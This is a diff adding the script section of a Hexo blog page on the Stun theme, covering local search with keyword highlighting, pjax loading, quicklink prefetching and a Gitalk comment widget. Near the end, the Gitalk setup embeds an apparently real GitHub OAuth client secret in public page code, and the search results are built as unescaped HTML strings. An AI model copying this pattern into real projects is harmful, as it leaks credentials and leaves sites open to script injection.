+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keypress', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css('overflow', 'auto');
+  $('.search-popup')
+    .removeClass('show')
+    .velocity('stop')
+    .velocity('transition.expandOut', {
+      duration: 300
+    });
+  $('.search-mask')
+    .velocity('stop')
+    .velocity('transition.fadeOut', {
+      duration: 300
+    });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .addClass('show')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.scrollTo2screen) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/npm/quicklink@1.0.1/dist/quicklink.umd.js"></script><script>function initQuicklink() {
+  quicklink({
+    timeout: '5000',
+    priority: 'true',
+    ignores: [uri => uri.includes('#'), uri => uri === 'https://hyswzw.github.io/2020/11/23/VulnHub_SuperMario/', /\/api\/?/,uri => uri.includes('.xml'),uri => uri.includes('.zip'),(uri, el) => el.hasAttribute('nofollow'),(uri, el) => el.hasAttribute('noprefetch')]
+  });
+}
+
+if (true || false) {
+  initQuicklink();
+} else {
+  window.addEventListener('DOMContentLoaded', initQuicklink, false);
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js" data-pjax=""></script><script src="https://cdn.jsdelivr.net/npm/js-md5@latest/src/md5.min.js" data-pjax=""></script><script data-pjax="">function loadGitalk () {
+  if (!document.getElementById('gitalk-container')) {
+    return;
+  }
+
+  var gitalk = new Gitalk({
+    id: md5(window.location.pathname.slice(1)),
+    clientID: 'b3620a1094d71cee97eb',
+    clientSecret: '77aa4a3c2f297df7673c71d9775d164d300b0cfb',
+    repo: 'Comment',
+    owner: 'HYSWZW',
+    admin: ['HYSWZW'],
+    distractionFreeMode: 'true',
+    language: 'zh-CN'
+  });
+  gitalk.render('gitalk-container');
+}
+
+if (true) {
+  loadGitalk();
+} else {
+  window.addEventListener('DOMContentLoaded', loadGitalk, false);
+}</script><script src="/js/utils.js?v=1.7.0"></script><script src="/js/stun-boot.js?v=1.7.0"></script><script src="/js/scroll.js?v=1.7.0"></script><script src="/js/header.js?v=1.7.0"></script><script src="/js/sidebar.js?v=1.7.0"></script></body></html>
